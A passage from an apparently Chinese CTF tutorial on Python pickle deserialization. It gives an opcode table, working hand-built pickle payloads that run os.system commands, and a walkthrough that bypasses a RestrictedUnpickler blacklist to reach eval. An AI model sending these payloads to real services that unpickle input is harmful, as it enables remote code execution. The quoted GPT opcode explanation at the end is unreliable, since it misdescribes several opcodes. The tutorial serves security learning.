<th>memo上的变化</th>
</tr>
</thead>
<tbody>
<tr>
<td>c</td>
<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象</td>
<td>S’xxx’\n（也可以使用双引号、'等python字符串形式）</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
<td>无</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
<td>无</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
<td>无</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
<td>无</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
<td>无</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
<td>对象被储存</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
<td>无</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
<td>无</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
<td>无</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
<td>无</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
<td>无</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
<td>无</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
<td>无</td>
</tr>
</tbody>
</table>
<p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示： <code>b'I01\n'</code> ； <code>FALSE</code> 也可以用 <code>I</code> 表示： <code>b'I00\n'</code> ，其他opcode可以在<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle库的源代码</a>中找到。<br>
由这些opcode我们可以得到一些需要注意的地方：</p>
<ul>
<li>编写opcode时要想象栈中的数据，以正确使用每种opcode。</li>
<li>在理解时注意与python本身的操作对照（比如python列表的<code>append</code>对应<code>a</code>、<code>extend</code>对应<code>e</code>；字典的<code>update</code>对应<code>u</code>）。</li>
<li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库。</li>
<li>pickle不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li>
<li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li>
</ul>
<h3 id="542-拼接opcode">5.4.2 拼接opcode</h3>
<p>将第一个pickle流结尾表示结束的 <code>.</code> 去掉，将第二个pickle流与第一个拼接起来即可。</p>
<h4 id="全局变量覆盖">全局变量覆盖</h4>
<p>python源码：</p>
<pre><code class="hljs py"><span class="hljs-comment"># secret.py</span>
name=<span class="hljs-string">'TEST3213qkfsmfo'</span>
<span class="hljs-comment"># main.py</span>
<span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> secret

opcode=<span class="hljs-string">'''c__main__</span>
<span class="hljs-string">secret</span>
<span class="hljs-string">(S'name'</span>
<span class="hljs-string">S'1'</span>
<span class="hljs-string">db.'''</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">'before:'</span>,secret.name)

output=pickle.loads(opcode.encode())

<span class="hljs-built_in">print</span>(<span class="hljs-string">'output:'</span>,output)
<span class="hljs-built_in">print</span>(<span class="hljs-string">'after:'</span>,secret.name)</code></pre>
<p>首先，通过 <code>c</code> 获取全局变量 <code>secret</code> ，然后建立一个字典，并使用 <code>b</code> 对secret进行属性设置，使用到的payload：</p>
<pre><code class="hljs py">opcode=<span class="hljs-string">'''c__main__</span>
<span class="hljs-string">secret</span>
<span class="hljs-string">(S'name'</span>
<span class="hljs-string">S'1'</span>
<span class="hljs-string">db.'''</span></code></pre>
<p>输出如下：</p>
<pre><code class="hljs py">before: TEST3213qkfsmfo
output: &lt;module <span class="hljs-string">'secret'</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'D:\\Pythonproject\\Pickle_Study\\secret.py'</span>&gt;
after: <span class="hljs-number">1</span></code></pre>
<h4 id="函数执行">函数执行</h4>
<p>与函数执行相关的opcode有三个： <code>R</code> 、 <code>i</code> 、 <code>o</code> ，所以我们可以从三个方向进行构造：</p>
<p><code>R</code> ：</p>
<pre><code class="hljs py"><span class="hljs-string">b'''cos</span>
<span class="hljs-string">system</span>
<span class="hljs-string">(S'whoami'</span>
<span class="hljs-string">tR.'''</span></code></pre>
<p><code>i</code> ：</p>
<pre><code class="hljs py"><span class="hljs-string">b'''(S'whoami'</span>
<span class="hljs-string">ios</span>
<span class="hljs-string">system</span>
<span class="hljs-string">.'''</span></code></pre>
<p><code>o</code> ：</p>
<pre><code class="hljs py"><span class="hljs-string">b'''(cos</span>
<span class="hljs-string">system</span>
<span class="hljs-string">S'whoami'</span>
<span class="hljs-string">o.'''</span></code></pre>
<h4 id="实例化对象">实例化对象</h4>
<p>实例化对象是一种特殊的函数执行，这里简单的使用 <code>R</code> 构造一下，其他方式类似：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

poc = <span class="hljs-string">b'''c__main__</span>
<span class="hljs-string">Student</span>
<span class="hljs-string">(S'hybcx'</span>
<span class="hljs-string">S'19'</span>
<span class="hljs-string">tR.'''</span>

a = pickle.loads(poc)
<span class="hljs-built_in">print</span>(a.name, a.age)</code></pre>
<p>到这里已经基本熟练对于该手工构造payload了，也能对每条语句看懂，不过有点疑惑的就是最前面的b，对于上述表格的解释，我还是有点懵懂，只是感觉b只是一个使后续的字符串成为一个对象的作用吧，可能。</p>
<h4 id="pker的使用推荐">pker的使用（推荐）</h4>
<ul>
<li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82%E8%A7%A3%E6%9E%90%E5%99%A8%E7%9A%84%E5%8E%9F%E7%90%86%E8%A7%81%E4%BD%9C%E8%80%85%E7%9A%84paper%EF%BC%9A">https://github.com/eddieivan01/pker下载源码。解析器的原理见作者的paper：</a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7012">通过AST来构造Pickle opcode</a>。</li>
<li>使用pker，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li>
</ul>
<h4 id="注意事项">注意事项</h4>
<p>pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：</p>
<pre><code class="hljs py"><span class="hljs-comment"># linux(注意posix):</span>
<span class="hljs-string">b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'</span>

<span class="hljs-comment"># windows(注意nt):</span>
<span class="hljs-string">b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'</span></code></pre>
<h3 id="543-ctf实战">5.4.3 CTF实战</h3>
<h4 id="做题之前了解pickleunpicklerfind_class">做题之前：了解<code>pickle.Unpickler.find_class()</code></h4>
<p>由于官方针对pickle的安全问题的建议是修改<code>find_class()</code>，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如</p>
<p>何绕过该函数很重要。</p>
<p>什么时候会调用<code>find_class()</code>：</p>
<ol>
<li>从opcode角度看，当出现<code>c</code>、<code>i</code>、<code>b'\x93'</code>时，会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。</li>
<li>从python代码来看，<code>find_class()</code>只会在解析opcode时调用一次，所以只要绕过opcode执行过程，<code>find_class()</code>就不会再调用，也就是说<code>find_class()</code>只需要调用过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过<code>__import__</code>绕过一些黑名单。</li>
</ol>
<p>下面先看两个例子：</p>
<pre><code class="hljs py">safe_builtins = {<span class="hljs-string">'range'</span>,<span class="hljs-string">'complex'</span>,<span class="hljs-string">'set'</span>,<span class="hljs-string">'frozenset'</span>,<span class="hljs-string">'slice'</span>,}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):
        <span class="hljs-comment"># Only allow safe classes from builtins.</span>
        <span class="hljs-keyword">if</span> module == <span class="hljs-string">"builtins"</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">in</span> safe_builtins:
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)
        <span class="hljs-comment"># Forbid everything else.</span>
        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">"global '%s.%s' is forbidden"</span> %(module, name))</code></pre>
<pre><code class="hljs py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):
        <span class="hljs-keyword">if</span> module == <span class="hljs-string">'__main__'</span>: <span class="hljs-comment"># 只允许__main__模块</span>
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[<span class="hljs-string">'__main__'</span>], name)
        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">"global '%s.%s' is forbidden"</span> % (module, name))</code></pre>
<ul>
<li>第一个例子是官方文档中的例子，使用白名单限制了能够调用的模块为<code>{'range','complex','set','frozenset','slice',}</code>。</li>
<li>第二个例子是高校战疫网络安全分享赛·webtmp中的过滤方法，只允许<code>__main__</code>模块。虽然看起来很安全，但是被引入主程序的模块都可以通过<code>__main__</code>调用修改，所以造成了变量覆盖。</li>
</ul>
<p>由这两个例子我们了解到，对于开发者而言，使用白名单谨慎列出安全的模块则是规避安全问题的方法；而如何绕过<code>find_class</code>函数内</p>
<p>的限制就是pickle反序列化解题的关键。</p>
<p>此外，CTF中的考察点往往还会结合python的基础知识（往往是内置的模块、属性、函数）进行，考察对白名单模块的熟悉程度，所以做</p>
<p>题的时候可以先把白名单模块的文档看一看:)</p>
<h5 id="绕过builtins">绕过builtins</h5>
<p>在一些例子中，我们常常会见到<code>module=="builtins"</code>这一限制，比如官方文档中的例子，只允许我们导入<code>builtins</code>这一模块</p>
<pre><code class="hljs py"><span class="hljs-keyword">if</span> module == <span class="hljs-string">"builtins"</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">in</span> safe_builtins:
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)</code></pre>
<p>那么什么是<code>builtins</code>模块呢？</p>
<p>当我们启动Python之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用，如</p>
<pre><code class="hljs py">&gt;&gt;&gt;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)
<span class="hljs-number">1</span></code></pre>
<p>上述这类函数被我们称为”内置函数”，这其实就是builtins模块的功劳，这些内置函数都是包含在builtins模块内的。而Python解释器在启动时已经自动帮我们导入了builtins模块，所以我们自然就可以使用这些内置函数了。</p>
<p>我们可以通过<code>for i in sys.modules['builtins'].__dict__:print(i)</code>来查看该模块中包含的所有模块函数等，大致如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231116211655339.png" alt="image-20231116211655339"></p>
<h4 id="code-breakingpicklecode">Code-Breaking:picklecode</h4>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> io
<span class="hljs-keyword">import</span> builtins
 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):
    blacklist = {<span class="hljs-string">'eval'</span>, <span class="hljs-string">'exec'</span>, <span class="hljs-string">'execfile'</span>, <span class="hljs-string">'compile'</span>, <span class="hljs-string">'open'</span>, <span class="hljs-string">'input'</span>, <span class="hljs-string">'__import__'</span>, <span class="hljs-string">'exit'</span>}
 
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):
        <span class="hljs-comment"># Only allow safe classes from builtins.</span>
        <span class="hljs-keyword">if</span> module == <span class="hljs-string">"builtins"</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)
        <span class="hljs-comment"># Forbid everything else.</span>
        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">"global '%s.%s' is forbidden"</span> %
                                     (module, name))
 
<span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):
    <span class="hljs-string">"""Helper function analogous to pickle.loads()."""</span>
    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</code></pre>
<p>题目将pickle能够引入的模块限定为<code>builtins</code>，并且设置了子模块黑名单：<code>{'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}</code>，于是我们能够<strong>直接</strong>利用的模块有：</p>
<ul>
<li><code>builtins</code>模块中，黑名单外的子模块。</li>
<li>已经<code>import</code>的模块：<code>io</code>、<code>builtins</code>（需要先利用<code>builtins</code>模块中的函数）</li>
</ul>
<p>黑名单中没有<code>getattr</code>，所以可以通过<code>getattr</code>获取<code>io</code>或<code>builtins</code>的子模块以及子模块的子模块:)，而<code>builtins</code>里有<code>eval、exec</code>等危险函数，即使在黑名单中，也可以通过<code>getattr</code>获得。pickle不能直接获取<code>builtins</code>一级模块，但可以通过<code>builtins.globals()</code>获得<code>builtins</code>；这样就可以执行任意代码了。</p>
<p>我们可以借鉴Python沙箱逃逸的思路，获取我们想要的函数。代码没有禁用<code>getattr()</code>函数，<code>getattr</code>可以获取对象的属性值。因此我们可以通过<code>builtins.getattr(builtins,'eval')</code>的形式来获取eval函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231116212103967.png" alt="image-20231116212103967"></p>
<p>接下来我们得构造出一个<code>builtins</code>模块来传给<code>getattr</code>的第一个参数，我们可以使用<code>builtins.globals()</code>函数获取builtins模块包含的内容</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> builtins
<span class="hljs-built_in">print</span>(builtins.<span class="hljs-built_in">globals</span>())</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231116212125197.png" alt="image-20231116212125197"></p>
<p>可见builtins模块中仍包含builtins模块。由于返回的结果是个字典，所以我们还需要获取get()函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231116212132995.png" alt="image-20231116212132995"></p>
<p>最终构造的payload为<code>builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command)</code></p>
<p>思路有了，下面就是手写opcode了。首先获取get函数</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> pickletools
 
opcode=<span class="hljs-string">b'''cbuiltins</span>
<span class="hljs-string">getattr</span>
<span class="hljs-string">(cbuiltins</span>
<span class="hljs-string">dict</span>
<span class="hljs-string">S'get'</span>
<span class="hljs-string">tR.</span>
<span class="hljs-string">'''</span>
pickletools.dis(opcode)
<span class="hljs-built_in">print</span>(pickle.loads(opcode))
 
<span class="hljs-comment">###结果如下</span>
    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">'builtins getattr'</span>
   <span class="hljs-number">18</span>: (    MARK
   <span class="hljs-number">19</span>: c        GLOBAL     <span class="hljs-string">'builtins dict'</span>
   <span class="hljs-number">34</span>: S        STRING     <span class="hljs-string">'get'</span>
   <span class="hljs-number">41</span>: t        TUPLE      (MARK at <span class="hljs-number">18</span>)
   <span class="hljs-number">42</span>: R    REDUCE
   <span class="hljs-number">43</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">0</span>
&lt;method <span class="hljs-string">'get'</span> of <span class="hljs-string">'dict'</span> objects&gt;</code></pre>
<p>然后获取globals()字典</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> pickletools
 
opcode2=<span class="hljs-string">b'''cbuiltins</span>
<span class="hljs-string">globals</span>
<span class="hljs-string">)R.</span>
<span class="hljs-string">'''</span>
 
pickletools.dis(opcode2)
<span class="hljs-built_in">print</span>(pickle.loads(opcode2))
 
<span class="hljs-comment">###结果如下</span>
    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">'builtins globals'</span>
   <span class="hljs-number">18</span>: )    EMPTY_TUPLE
   <span class="hljs-number">19</span>: R    REDUCE
   <span class="hljs-number">20</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">1</span>
{<span class="hljs-string">'__name__'</span>: <span class="hljs-string">'__main__'</span>, <span class="hljs-string">'__doc__'</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">'__package__'</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">'__loader__'</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="hljs-built_in">object</span> at <span class="hljs-number">0x000001EF06A308B0</span>&gt;, <span class="hljs-string">'__spec__'</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">'__annotations__'</span>: {}, <span class="hljs-string">'__builtins__'</span>: &lt;module <span class="hljs-string">'builtins'</span> (built-<span class="hljs-keyword">in</span>)&gt;, <span class="hljs-string">'__file__'</span>: <span class="hljs-string">'C:/Users/34946/Desktop/安全学习/Pickle_Learning/Pickle_builtins1.py'</span>, <span class="hljs-string">'__cached__'</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">'pickle'</span>: &lt;module <span class="hljs-string">'pickle'</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'C:\\Users\\34946\\AppData\\Local\\Programs\\Python\\Python38\\lib\\pickle.py'</span>&gt;, <span class="hljs-string">'pickletools'</span>: &lt;module <span class="hljs-string">'pickletools'</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'C:\\Users\\34946\\AppData\\Local\\Programs\\Python\\Python38\\lib\\pickletools.py'</span>&gt;, <span class="hljs-string">'opcode1'</span>: <span class="hljs-string">b"cbuiltins\ngetattr\n(cbuiltins\ndict\nS'get'\ntR.\n"</span>, <span class="hljs-string">'opcode2'</span>: <span class="hljs-string">b'cbuiltins\nglobals\n)R.\n'</span>}</code></pre>
<p>现在我们有了get()，有了globals()字典，把他们组合起来我们就能够获取builtins模块了</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> pickletools
 
opcode3=<span class="hljs-string">b'''cbuiltins</span>
<span class="hljs-string">getattr</span>
<span class="hljs-string">(cbuiltins</span>
<span class="hljs-string">dict</span>
<span class="hljs-string">S'get'</span>
<span class="hljs-string">tR(cbuiltins</span>
<span class="hljs-string">globals</span>
<span class="hljs-string">)RS'__builtins__'</span>
<span class="hljs-string">tR.'''</span>
 
<span class="hljs-comment">#以上opcode相当于执行了builtins.getattr(builtins.dict,'get')(builtins.globals(),'builtins')</span>
 
pickletools.dis(opcode3)
<span class="hljs-built_in">print</span>(pickle.loads(opcode3))
 
<span class="hljs-comment">###结果如下</span>
    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">'builtins getattr'</span>
   <span class="hljs-number">18</span>: (    MARK
   <span class="hljs-number">19</span>: c        GLOBAL     <span class="hljs-string">'builtins dict'</span>
   <span class="hljs-number">34</span>: S        STRING     <span class="hljs-string">'get'</span>
   <span class="hljs-number">41</span>: t        TUPLE      (MARK at <span class="hljs-number">18</span>)
   <span class="hljs-number">42</span>: R    REDUCE
   <span class="hljs-number">43</span>: (    MARK
   <span class="hljs-number">44</span>: c        GLOBAL     <span class="hljs-string">'builtins globals'</span>
   <span class="hljs-number">62</span>: (        MARK
   <span class="hljs-number">63</span>: t            TUPLE      (MARK at <span class="hljs-number">62</span>)
   <span class="hljs-number">64</span>: R        REDUCE
   <span class="hljs-number">65</span>: S        STRING     <span class="hljs-string">'builtins'</span>
   <span class="hljs-number">77</span>: t        TUPLE      (MARK at <span class="hljs-number">43</span>)
   <span class="hljs-number">78</span>: R    REDUCE
   <span class="hljs-number">79</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">0</span>
&lt;module <span class="hljs-string">'builtins'</span> (built-<span class="hljs-keyword">in</span>)&gt;</code></pre>
<p>最后我们再调用获取到的builtins的eval函数即可</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
 
opcode4=<span class="hljs-string">b'''cbuiltins</span>
<span class="hljs-string">getattr</span>
<span class="hljs-string">(cbuiltins</span>
<span class="hljs-string">getattr</span>
<span class="hljs-string">(cbuiltins</span>
<span class="hljs-string">dict</span>
<span class="hljs-string">S'get'</span>
<span class="hljs-string">tR(cbuiltins</span>
<span class="hljs-string">globals</span>
<span class="hljs-string">)RS'__builtins__'</span>
<span class="hljs-string">tRS'eval'</span>
<span class="hljs-string">tR.'''</span>
 
<span class="hljs-built_in">print</span>(pickle.loads(opcode4))
 
<span class="hljs-comment">###</span>
&lt;built-<span class="hljs-keyword">in</span> function <span class="hljs-built_in">eval</span>&gt;</code></pre>
<p>最终payload为：</p>
<pre><code class="hljs py"><span class="hljs-string">b'''cbuiltins</span>
<span class="hljs-string">getattr</span>
<span class="hljs-string">p0</span>
<span class="hljs-string">(cbuiltins</span>
<span class="hljs-string">dict</span>
<span class="hljs-string">S'get'</span>
<span class="hljs-string">tRp1</span>
<span class="hljs-string">cbuiltins</span>
<span class="hljs-string">globals</span>
<span class="hljs-string">)Rp2</span>
<span class="hljs-string">00g1</span>
<span class="hljs-string">(g2</span>
<span class="hljs-string">S'builtins'</span>
<span class="hljs-string">tRp3</span>
<span class="hljs-string">0g0</span>
<span class="hljs-string">(g3</span>
<span class="hljs-string">S'eval'</span>
<span class="hljs-string">tR(S'__import__("os").system("whoami")'</span>
<span class="hljs-string">tR.</span>
<span class="hljs-string">'''</span></code></pre>
<p>这里附上GPT的分析，但解释的不太好。。。</p>
<pre><code class="hljs py">让我们逐行解释上述 Pickle 数据块中的代码，并说明每行之间的共同作用：

<span class="hljs-number">1.</span> `cbuiltins`: 这个操作码表示使用 `builtins` 模块。

<span class="hljs-number">2.</span> `<span class="hljs-built_in">getattr</span>`: 这个操作码表示调用 `builtins` 模块的 `<span class="hljs-built_in">getattr</span>` 函数。

<span class="hljs-number">3.</span> `p0`: 这个操作码表示将接下来的值压入堆栈顶，标记为位置 `<span class="hljs-number">0</span>`。

<span class="hljs-number">4.</span> `(cbuiltins`: 这个操作码表示创建一个元组，包含了 `builtins` 模块。

共同作用：`cbuiltins` 和 `<span class="hljs-built_in">getattr</span>` 一起表示使用 `builtins` 模块的 `<span class="hljs-built_in">getattr</span>` 函数。

结果：此时堆栈顶部包含了一个表示 `<span class="hljs-built_in">getattr</span>` 函数的对象。

<span class="hljs-number">5.</span> `<span class="hljs-built_in">dict</span>`: 这个操作码表示创建一个空字典。

<span class="hljs-number">6.</span> `S<span class="hljs-string">'get'</span>`: 这个操作码表示将字符串 `<span class="hljs-string">'get'</span>` 压入堆栈。

<span class="hljs-number">7.</span> `tRp1`: 这个操作码表示调用 `<span class="hljs-built_in">dict</span>` 构造函数，将键值对加入字典。这里的键是字符串 `<span class="hljs-string">'get'</span>`。

共同作用：`<span class="hljs-built_in">dict</span>`、`S<span class="hljs-string">'get'</span>` 和 `tRp1` 一起表示创建一个字典，其中包含了一个键值对（键为 `<span class="hljs-string">'get'</span>`）。

结果：此时堆栈顶部包含了一个字典。

<span class="hljs-number">8.</span> `cbuiltins`: 这个操作码表示使用 `builtins` 模块。

<span class="hljs-number">9.</span> `<span class="hljs-built_in">globals</span>`: 这个操作码表示调用 `builtins` 模块的 `<span class="hljs-built_in">globals</span>` 函数。

<span class="hljs-number">10.</span> `)Rp2`: 这个操作码表示调用 `<span class="hljs-built_in">dict</span>` 构造函数，将键值对加入字典。这里的键是字符串 `<span class="hljs-string">'globals'</span>`。

共同作用：`cbuiltins`、`<span class="hljs-built_in">globals</span>` 和 `)Rp2` 一起表示创建一个字典，其中包含了两个键值对。

结果：此时堆栈顶部包含了一个字典。

<span class="hljs-number">11.</span> `00g1`: 这个操作码表示将两个字典压入堆栈。

<span class="hljs-number">12.</span> `(g2`: 这个操作码表示创建一个元组，包含了两个字典。

<span class="hljs-number">13.</span> `S<span class="hljs-string">'builtins'</span>`: 这个操作码表示将字符串 `<span class="hljs-string">'builtins'</span>` 压入堆栈。

<span class="hljs-number">14.</span> `tRp3`: 这个操作码表示调用 `<span class="hljs-built_in">__import__</span>` 函数，并将堆栈顶部的两个值作为参数传递给 `<span class="hljs-built_in">__import__</span>`。

共同作用：`(g2`、`S<span class="hljs-string">'builtins'</span>` 和 `tRp3` 一起表示使用 `<span class="hljs-built_in">__import__</span>` 函数导入 `builtins` 模块。

结果：此时堆栈顶部包含了 `builtins` 模块的对象。

<span class="hljs-number">15.</span> `0g0`: 这个操作码表示将两个字典压入堆栈。

<span class="hljs-number">16.</span> `(g3`: 这个操作码表示创建一个元组，包含了两个字典。

<span class="hljs-number">17.</span> `S<span class="hljs-string">'eval'</span>`: 这个操作码表示将字符串 `<span class="hljs-string">'eval'</span>` 压入堆栈。

<span class="hljs-number">18.</span> `tR`: 这个操作码表示调用 `<span class="hljs-built_in">eval</span>` 函数，并将堆栈顶部的两个值作为参数传递给 `<span class="hljs-built_in">eval</span>`。

